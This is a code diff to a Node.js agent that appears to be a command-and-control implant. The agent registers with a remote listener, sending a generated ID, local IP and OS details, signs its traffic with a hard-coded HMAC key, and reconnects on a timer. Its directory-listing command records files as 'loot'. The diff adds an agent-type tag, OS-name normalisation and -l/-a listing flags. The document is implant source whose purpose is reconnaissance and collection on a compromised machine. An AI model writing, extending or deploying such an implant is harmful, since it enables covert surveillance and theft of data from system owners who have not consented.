@@ -13,7 +13,7 @@ const execAsync = promisify(exec);
 
 // Build-time configuration
 const LISTENER_HOST = process.env.ANOMALY_HOST || 'localhost';
-const LISTENER_PORT = process.env.ANOMALY_PORT || '8082';
+const LISTENER_PORT = process.env.ANOMALY_PORT || '8080';
 const LISTENER_ENDPOINT = process.env.ANOMALY_ENDPOINT || '/wiki';
 const HMAC_KEY = process.env.ANOMALY_HMAC_KEY || '76b7142fb03436325c744a35bd1302d0e35ec7e04c1857bdeed0549f051b99fb';
 const RECONNECT_INTERVAL = parseInt(process.env.ANOMALY_INTERVAL || '15', 10);
@@ -57,6 +57,7 @@ function wrapWithHMAC(data) {
     const jsonData = JSON.stringify(data);
     const { timestamp, signature } = signRequest('POST', LISTENER_ENDPOINT, jsonData);
     return JSON.stringify({
+        agent_type: 'anomaly',
         data: JSON.parse(jsonData),
         timestamp,
         signature
@@ -126,12 +127,29 @@ function getLocalIP() {
     return 'unknown';
 }
 
+function getOSInfo() {
+    let platform = os.platform();
+    if (platform === 'win32') {
+        platform = 'windows';
+    } else if (platform === 'darwin') {
+        platform = 'macos';
+    }
+
+    let arch = os.arch();
+    if (arch === 'x64') {
+        arch = 'x86_64';
+    }
+    
+    return `${platform} ${arch}`;
+}
+
 async function registerAgent() {
     const registration = {
         uuid: state.agentId,
         name: state.agentId,
         ip: getLocalIP(),
-        os: `${os.platform()} ${os.arch()}`,
+        os: getOSInfo(),
+        agent_type: 'anomaly',
         reconnectInterval: state.reconnectInterval
     };
 
@@ -169,7 +187,32 @@ function formatFileSize(size) {
 }
 
 async function handleLs(args) {
-    const targetPath = args[0] || '.';
+    // Parse flags and path (supports -l, -a and -- to end flags)
+    let targetPath = '.';
+    let showAll = false;
+    let longFormat = false;
+
+    for (let i = 0; i < args.length; i++) {
+        const arg = args[i];
+        if (arg === '--') {
+            if (i + 1 < args.length) {
+                targetPath = args[i + 1];
+            }
+            break;
+        }
+        if (typeof arg === 'string' && arg.startsWith('-') && arg.length > 1) {
+            for (const ch of arg.slice(1)) {
+                if (ch === 'a') showAll = true;
+                if (ch === 'l') longFormat = true;
+            }
+            continue;
+        }
+        if (typeof arg === 'string' && arg.length > 0) {
+            targetPath = arg;
+            break;
+        }
+    }
+
     const absPath = path.resolve(targetPath);
 
     const stats = await fs.promises.stat(absPath);
@@ -185,9 +228,23 @@ async function handleLs(args) {
     const dirs = entries.filter(e => e.isDirectory());
     const files = entries.filter(e => !e.isDirectory());
 
+    const formatLine = (entry, stats) => {
+        const icon = entry.isDirectory() ? '📁' : '📄';
+        if (!longFormat) {
+            const sizeStr = entry.isDirectory() ? '' : ` (${formatFileSize(stats.size)})`;
+            return `├── ${icon} ${entry.name}${entry.isDirectory() ? '/' : ''}${sizeStr}`;
+        }
+        const sizeStr = entry.isDirectory() ? '-' : formatFileSize(stats.size);
+        const mode = (stats.mode & 0o777).toString(8).padStart(4, '0');
+        const mtime = new Date(stats.mtime).toISOString().replace('T', ' ').split('.')[0];
+        return `${icon} ${mode} ${sizeStr.padStart(8, ' ')} ${mtime} ${entry.name}${entry.isDirectory() ? '/' : ''}`;
+    };
+
     for (const entry of dirs) {
+        if (!showAll && entry.name.startsWith('.')) continue;
         const fullPath = path.join(absPath, entry.name);
-        result += `├── 📁 ${entry.name}/\n`;
+        const entryStats = await fs.promises.stat(fullPath);
+        result += `${formatLine(entry, entryStats)}\n`;
         lootEntries.push({
             type: 'directory',
             path: fullPath,
@@ -197,14 +254,15 @@ async function handleLs(args) {
     }
 
     for (const entry of files) {
+        if (!showAll && entry.name.startsWith('.')) continue;
         const fullPath = path.join(absPath, entry.name);
-        const stats = await fs.promises.stat(fullPath);
-        result += `├── 📄 ${entry.name} (${formatFileSize(stats.size)})\n`;
+        const entryStats = await fs.promises.stat(fullPath);
+        result += `${formatLine(entry, entryStats)}\n`;
         lootEntries.push({
             type: 'file',
             path: fullPath,
             name: entry.name,
-            size: stats.size
+            size: entryStats.size
         });
     }
 
